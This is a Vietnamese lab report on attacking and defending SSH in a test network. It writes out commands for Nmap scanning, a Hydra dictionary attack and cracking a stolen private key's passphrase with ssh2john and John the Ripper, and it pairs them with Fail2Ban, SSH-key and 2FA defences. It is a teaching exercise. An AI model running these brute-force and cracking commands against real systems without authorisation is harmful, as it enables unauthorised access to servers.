
# TRIỂN KHAI THỰC NGHIỆM

## 1. Các kịch bản tấn công và phòng thủ

| Đối tượng                | Kịch bản tấn công                        | Phương pháp tấn công | Phương pháp phòng chống  | Công cụ                               |
| ------------------------ | ---------------------------------------- | -------------------- | ------------------------ | ------------------------------------- |
| Kẻ tấn công (Kali Linux) | Thử đăng nhập SSH với danh sách mật khẩu | Dictionary Attack    | SSH Key, Fail2Ban        | Hydra, Python (Paramiko)              |
| Kẻ tấn công              | Bẻ khoá SSH key (passphrase)             | Brute-force SSH Key  | SSHKey + Passphrase mạnh | John the Ripper, Google Authenticator |

## 2. Triển khai kịch bản

### 2.1. Tấn công từ điển và phòng chống

#### a. Tấn công:

**Mô hình:**

* Kali Linux (Attacker) + Ubuntu Server (SSH target)

**Quy trình:**

1. Xác định IP và cổng mục tiêu bằng Nmap:

```bash
nmap -p 22 --open 192.168.1.0/24
```

2. Chuẩn bị danh sách:

* `users.txt` (tên người dùng)
* `passwords.txt` (mật khẩu)

3. Tấn công bằng Hydra:

```bash
hydra -L users.txt -P passwords.txt ssh://192.168.217.135
```

4. Kế tấn công đăng nhập nếu tìm ra:

```bash
ssh buihieu@192.168.217.135
```

5. Hoặc dùng script Python:

* Thư viện: `paramiko`
* Script tự động thử các cặp username/password

#### b. Phòng chống:

##### Cách 1: Dùng Fail2Ban

1. Tạo file `/etc/fail2ban/jail.local`:

```ini
[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 600
findtime = 600
```

2. Khởi động lại Fail2Ban:

```bash
sudo systemctl restart fail2ban
```

3. Kiểm tra IP bị chặn:

```bash
sudo fail2ban-client status sshd
```

##### Cách 2: Dùng SSH Key

1. Tạo key:

```bash
ssh-keygen -t rsa -b 2048 -f ~/.ssh/test_key -N ""
```

2. Copy public key lên server:

```bash
ssh-copy-id -i ~/.ssh/test_key.pub buihieu@192.168.217.135
```

3. Cấu hình SSH server:

```bash
sudo nano /etc/ssh/sshd_config
```

* Sửa:

```
PasswordAuthentication no
PubkeyAuthentication yes
UsePAM no
```

* Restart SSH:

```bash
sudo systemctl restart ssh
```

4. Đăng nhập bằng private key:

```bash
ssh -i ~/.ssh/test_key buihieu@192.168.217.135
```

### 2.2. Tấn công brute force passphrase SSH key

#### a. Tấn công:

**Giả thiết:** kẻ tấn công đã lấy được file `id_rsa` (private key) và muốn bẻ passphrase.

**Công cụ:** `John the Ripper`

**Thực hiện:**

1. Chuyển đổi key sang định dạng thích hợp:

```bash
ssh2john id_rsa > hash.txt
```

2. Bẻ passphrase:

```bash
john --wordlist=passwords.txt hash.txt
```

3. Nếu bẻ thành công, dùng key đã gỡ bỏ passphrase để SSH:

```bash
ssh -i id_rsa user@target_ip
```

#### b. Phòng chống:

* Dùng passphrase phức tạp
* Kết hợp 2FA (Google Authenticator)

## KếT LUẬN 

Qua thực nghiệm, đã thực hiện tấn công brute-force vào SSH thông qua danh sách tên/mật khẩu và phá passphrase của private key. Qua đó chứng minh tính nguy hiểm của các thiếu sót trong cài đặt SSH.

Tuy nhiên, các phương pháp phòng chống như Fail2Ban, SSH Key và 2FA đã cho thấy hiệu quả cao trong việc ngăn chặn và phát hiện tấn công. Triển khai chính xác và kiểm tra thường xuyên là cách tốt nhất để bảo vệ hệ thống trước nguy cơ từ Internet.
